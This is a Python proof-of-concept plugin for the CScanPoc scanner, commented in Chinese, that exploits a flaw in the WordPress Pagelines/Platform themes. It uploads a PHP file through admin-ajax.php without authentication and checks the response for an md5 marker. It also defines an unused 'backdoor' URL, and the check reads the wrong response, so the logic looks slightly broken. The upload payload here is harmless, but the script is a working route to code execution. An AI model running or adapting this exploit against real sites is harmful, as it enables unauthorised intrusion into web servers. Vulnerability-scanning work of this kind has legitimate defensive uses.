# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0029' # 平台漏洞编号，留空
    name = 'Unkonwn' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-01-27'  # 漏洞公布时间
    desc = '''
        WordPress主题Pagelines和Platform权限提升漏洞。
    ''' # 漏洞描述
    ref = 'http://www.freebuf.com/vuls/57594.html' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress主题Pagelines和Platform'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f654649f-39fd-4f47-81a2-57b584627ea1'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload='/wp-admin/admin-ajax.php?action=test&page=pagelines'
            data = '''------WebKitFormBoundary1Ja5UxAmMrAAwPGM
                Content-Disposition: form-data; name="settings_upload"

                settings
                ------WebKitFormBoundary1Ja5UxAmMrAAwPGM
                Content-Disposition: form-data; name="file"; filename="Settingssettings.txt"
                Content-Type: text/plain

                <?php
                echo md5(1);
                die();
                ?>
                ------WebKitFormBoundary1Ja5UxAmMrAAwPGM
                Content-Disposition: form-data; name="submit"

                Submit
                ------WebKitFormBoundary1Ja5UxAmMrAAwPGM--
                '''
            header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1Ja5UxAmMrAAwPGM"
            uploader_url = '{target}'.format(target=self.target)+payload
            bockdoor_url = '{target}'.format(target=self.target)+'/wp-content/wp-cenfig.php'
            code, head, res, _, _ = hh.http('-H "%s" -d "%s" "%s"' % (header, data, uploader_url))
                       
            if code ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()